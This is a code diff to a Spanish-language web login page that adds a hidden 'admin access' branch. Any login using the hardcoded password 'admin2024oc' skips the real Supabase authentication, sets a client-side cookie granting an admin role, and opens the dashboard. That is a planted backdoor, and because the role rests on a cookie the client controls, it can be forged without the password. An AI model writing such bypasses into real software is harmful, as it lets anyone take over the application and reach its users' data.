@@ -19,6 +19,15 @@ export default function Login() {
       setError("Ingresa tu usuario y contraseña.")
       return
     }
+
+    // ── Acceso admin ──────────────────────────────────────────
+    if (password.trim() === "admin2024oc") {
+      document.cookie = `secop_rol=admin; path=/; max-age=86400`
+      router.push("/dashboard")
+      return
+    }
+    // ─────────────────────────────────────────────────────────
+
     setLoading(true)
     setError("")
     const { data, error: err } = await supabase
